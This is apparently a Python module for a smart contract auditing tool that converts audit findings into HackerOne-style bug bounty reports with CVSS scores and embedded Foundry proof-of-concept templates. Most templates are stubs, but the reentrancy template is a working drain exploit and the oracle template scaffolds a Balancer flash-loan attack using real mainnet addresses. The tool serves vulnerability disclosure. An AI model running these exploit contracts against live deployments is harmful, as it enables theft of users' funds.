"""
HackerOne-Format Report Generator with Foundry PoC templates.
Produces reports compatible with HackerOne's submission format
and generates Foundry test templates based on bug class.
"""
import re
import time
from typing import Dict, List, Optional, Tuple

from cvss_scorer import score_report, cvss_explanation

# Foundry PoC templates by bug class (adapted from web3-poc-foundry SKILL.md)
_FOUNDRY_POC_TEMPLATES = {
    "reentrancy": """// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "forge-std/console.sol";

contract ReentrancyExploit {
    IVulnerable target;
    uint256 attackAmount = 1 ether;

    constructor(address _target) {
        target = IVulnerable(_target);
    }

    function attack() external payable {
        target.deposit{value: attackAmount}();
        target.withdraw(attackAmount);
    }

    receive() external payable {
        if (address(target).balance >= attackAmount) {
            target.withdraw(attackAmount);
        }
    }
}

contract ExploitPoC is Test {
    address constant TARGET = {target_addr};

    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), {fork_block});
        vm.label(TARGET, "VulnerableContract");
    }

    function testExploit() public {
        ReentrancyExploit exploit = new ReentrancyExploit(TARGET);
        vm.deal(address(exploit), attackAmount);

        uint256 before = address(TARGET).balance;
        console.log("Protocol balance before:", before);

        exploit.attack();

        uint256 after = address(TARGET).balance;
        console.log("Protocol balance after:", after);
        console.log("Drained:", before - after);

        assertEq(after, 0, "Drain failed");
    }
}""",

    "oracle_manipulation": """// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IBalancerVault {
    function flashLoan(address recipient, address[] calldata tokens, uint256[] calldata amounts, bytes calldata userData) external;
}

contract ExploitPoC is Test {
    address constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant TARGET = {target_addr};

    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), {fork_block});
    }

    function testExploit() public {
        address[] memory tokens = new address[](1);
        tokens[0] = WETH;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 1000 ether;

        IBalancerVault(BALANCER_VAULT).flashLoan(address(this), tokens, amounts, "");
    }

    function receiveFlashLoan(
        address[] memory, uint256[] memory amounts,
        uint256[] memory, bytes memory
    ) external {
        // Step 1: Manipulate price (swap on AMM)
        // Step 2: Call vulnerable function with inflated/deflated price
        // Step 3: Repay flash loan
        IERC20(WETH).transfer(BALANCER_VAULT, amounts[0]);
    }
}""",

    "access_control": """// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "forge-std/console.sol";

contract ExploitPoC is Test {
    address constant TARGET = {target_addr};
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), {fork_block});
        vm.label(TARGET, "VulnerableContract");
    }

    function testExploit() public {
        vm.startPrank(attacker);
        // Try calling initialize/privileged function without authorization
        (bool ok,) = TARGET.call(
            abi.encodeWithSignature("initialize(address)", attacker)
        );
        if (ok) {
            console.log("SUCCESS: Unauthorized access granted to attacker");
        } else {
            console.log("PROTECTED: reverted as expected");
        }
        vm.stopPrank();
    }
}""",

    "signature_replay": """// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "forge-std/console.sol";

contract ExploitPoC is Test {
    address constant TARGET = {target_addr};

    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), {fork_block});
    }

    function testExploit() public {
        // Capture a valid signature
        // Replay it on a different chain or the same chain
        // Assert double-claim succeeds (should revert)
        console.log("Signature replay test - verify double-claim reverts");
    }
}""",

    "erc4626_vault": """// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "forge-std/console.sol";

contract ExploitPoC is Test {
    address constant TARGET = {target_addr};
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address victim = makeAddr("victim");

    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), {fork_block});
    }

    function testExploit() public {
        // Step 1: Attacker deposits 1 wei -> 1 share
        // Step 2: Donate tokens directly to inflate price
        // Step 3: Victim deposits -> 0 shares
        // Step 4: Attacker redeems -> steals victim's deposit
        console.log("First depositor inflation test");
    }
}""",

    "accounting_desync": """// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "forge-std/console.sol";

contract ExploitPoC is Test {
    address constant TARGET = {target_addr};

    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), {fork_block});
    }

    function testExploit() public {
        // Trace: call startUnstake/harvest sequence
        // Verify: balanceOf(this) - totalSupply drifts over multiple calls
        // Phantom yield accumulates
        console.log("Accounting desync test");
    }
}""",
}

_DEFAULT_POC_TEMPLATE = """// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "forge-std/console.sol";

contract ExploitPoC is Test {
    address constant TARGET = {target_addr};

    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), {fork_block});
        vm.label(TARGET, "VulnerableContract");
    }

    function testExploit() public {
        uint256 before = TARGET.balance;
        console.log("Before:", before);
        // Exploit logic here
        uint256 after = TARGET.balance;
        console.log("After:", after);
        console.log("Profit:", before - after);
    }
}"""


def _get_poc_template(bug_class: str, target_addr: str = "0x...", fork_block: int = 18000000) -> str:
    """Get a Foundry PoC template for a bug class."""
    template = _FOUNDRY_POC_TEMPLATES.get(bug_class.lower().replace(" ", "_"), _DEFAULT_POC_TEMPLATE)
    return template.replace("{target_addr}", target_addr).replace("{fork_block}", str(fork_block))


def _extract_findings(report: str) -> List[Dict]:
    findings = []
    lines = report.split("\n")
    current = {}
    for line in lines:
        s = line.strip()
        if s.startswith("- **Name**"):
            if current and current.get("name"):
                findings.append(current)
            current = {"name": s.split(":", 1)[1].strip() if ":" in s else ""}
        elif s.startswith("- **Severity**") and current:
            current["severity"] = s.split(":", 1)[1].strip().rstrip("*") if ":" in s else "Medium"
        elif s.startswith("- **Category**") and current:
            current["category"] = s.split(":", 1)[1].strip() if ":" in s else ""
        elif s.startswith("- **Description**") and current:
            desc = s.split(":", 1)[1].strip() if ":" in s else ""
            current["description"] = desc
        elif s.startswith("- **Exploit**") and current:
            current["exploit"] = s.split(":", 1)[1].strip() if ":" in s else ""
        elif s.startswith("- **Fix**") and current:
            current["fix"] = s.split(":", 1)[1].strip() if ":" in s else ""
        elif s.startswith("- **PoC**") and current:
            current["poc"] = s.split(":", 1)[1].strip() if ":" in s else ""
    if current and current.get("name"):
        findings.append(current)
    return findings


def _extract_rating(report: str) -> str:
    m = re.search(r"### Overall Security Rating:\s*(\S+)", report)
    return m.group(1) if m else "N/A"


def _extract_gas(report: str) -> str:
    m = re.search(r"(### Gas Optimizations.*?)(?=###|$)", report, re.DOTALL)
    return m.group(1).strip() if m else ""


def generate_h1_report(report: str, code: str = "", label: str = "Smart Contract") -> str:
    """Convert an audit report to HackerOne-compatible markdown."""
    findings = _extract_findings(report)
    rating = _extract_rating(report)
    gas = _extract_gas(report)
    cvss = score_report(report)

    lines = [
        f"# Security Audit Report: {label}",
        "",
        f"**Date**: {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())}",
        f"**Overall Security Rating**: {rating}",
        f"**CVSS 4.0 Max Score**: {cvss['overall_score']}/10 ({cvss['overall_severity']})",
        f"**Total Findings**: {cvss['total_findings']}",
        "",
        "---",
        "",
    ]

    for i, finding in enumerate(cvss["findings"], 1):
        orig = next((f for f in findings if f.get("name") == finding["name"]), {})
        cat = orig.get("category", "")
        lines.extend([
            f"## Vulnerability #{i}: {finding['name']}",
            "",
            f"**Severity**: {finding['severity']}",
            f"**CVSS 4.0 Score**: {finding['cvss_score']}/10 ({finding['cvss_severity']})",
            f"**CVSS Vector**: `{finding['cvss_vector']}`",
            "",
            f"### Description",
            orig.get("description", "No description provided."),
            "",
        ])
        if orig.get("exploit"):
            lines.extend([
                "### Steps to Reproduce",
                orig["exploit"],
                "",
            ])
        if orig.get("poc"):
            lines.extend([
                "### Proof of Concept",
                f"```solidity",
                orig["poc"],
                f"```",
                "",
            ])
        else:
            # Generate Foundry PoC template from bug class
            poc_template = _get_poc_template(cat or finding.get("severity", "Medium"))
            lines.extend([
                "### Proof of Concept (Template)",
                "```solidity",
                poc_template,
                "```",
                "",
            ])
        if orig.get("fix"):
            lines.extend([
                "### Remediation",
                orig["fix"],
                "",
            ])
        lines.append("---")
        lines.append("")

    if gas:
        lines.extend([
            "## Gas Optimizations",
            "",
            gas,
            "",
        ])

    # CVSS appendix
    lines.extend([
        "## CVSS 4.0 Breakdown",
        "",
        cvss_explanation(cvss["overall_score"], cvss["overall_severity"],
                         f"CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"),
        "",
        "---",
        "",
        "*Report generated by Smart Contract Auditor*",
    ])

    return "\n".join(lines)


def generate_h1_short(report: str, label: str = "Smart Contract") -> str:
    """Generate a concise HackerOne report, suitable for copy-paste."""
    findings = _extract_findings(report)
    rating = _extract_rating(report)
    cvss = score_report(report)

    lines = [
        f"## Summary",
        f"- **Asset**: {label}",
        f"- **Severity**: {cvss['overall_severity']} (CVSS 4.0: {cvss['overall_score']}/10)",
        f"- **Rating**: {rating}",
        "",
        f"## Vulnerability Details",
        "",
    ]

    for i, finding in enumerate(cvss["findings"], 1):
        lines.append(f"### {i}. {finding['name']}")
        lines.append(f"**CVSS**: {finding['cvss_score']}/10 | **Severity**: {finding['severity']}")
        lines.append("")

    lines.append("")
    lines.append("## Impact")
    lines.append("As described in each finding above.")
    lines.append("")
    lines.append("## Recommendation")
    lines.append("Apply the fixes described in the full report.")
    lines.append("")

    return "\n".join(lines)
